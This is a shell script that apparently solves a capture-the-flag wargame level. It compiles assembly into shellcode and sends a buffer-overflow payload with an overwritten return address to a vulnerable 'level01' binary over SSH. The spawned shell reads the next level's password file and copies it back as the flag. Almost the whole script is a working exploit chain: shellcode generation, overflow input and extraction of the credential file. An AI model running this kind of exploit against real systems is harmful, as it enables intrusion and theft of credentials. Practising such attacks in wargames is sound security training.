#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)";

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

generate_shellcode() {
    asm_path="$1";

    if [ -z "$asm_path" ]; then
        _log "Error: generate_shellcode requires an assembly source path.";
        return 1;
    elif [ ! -r "$asm_path" ]; then
        _log "Error: assembly source '$asm_path' is not readable.";
        return 1;
    fi

    trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
    tmpdir=$(mktemp -d) || return 1;

    nasm -f elf32 "$asm_path" -o "$tmpdir/exploit.o" || return 1;
    ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin" || return 1;
    objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin" || return 1;

    shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
    printf "%s" "$shellcode";

    rm -rf "$tmpdir";
    trap - EXIT INT TERM HUP QUIT;
    unset tmpdir shellcode asm_path;
    return 0;
}

# #### #
# MAIN #
# #### #

main() {
    # /!\ $host $port $username and $sshid_password are defined in the source '.sshid.sh' file.
    flag=""

    # Payload(s)

    shellcode="$(generate_shellcode './data/shellcode.asm')";
    shellcode_addr="\107\240\004\010"; # <=> a_user_login + sizeof("dat_wil").
    user_input_1="$(printf '%s%b' 'dat_wil' "$shellcode")";
    user_input_2="$(printf '%s%b' 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB' "$shellcode_addr")";

    shellcode_length="$(printf "%b" "$shellcode" | wc -c)";
    if [ "$shellcode_length" -ne "25" ]; then
        log "Error: The generated shellcode doesn't match the expected length. The related source file might have changed.";
        return 1;
    fi

    # Resolution

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket."; return 1; };
    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt && chmod 666 /tmp/flag.txt";
    (
        printf '%s' 'cat '/home/users/level02/.pass' > /tmp/flag.txt;';
    ) | ssh_exec_via_socket "$host" "$port" "$username" "(printf '%b\n' "$user_input_1"; printf '%b\n' "$user_input_2"; cat -) | env -i ~/level01";
    flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; };

    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    printf '%s' "$flag" > "$flag_path";
    log "Flag '$flag' has been written to '$flag_path'";
}

main "$@";
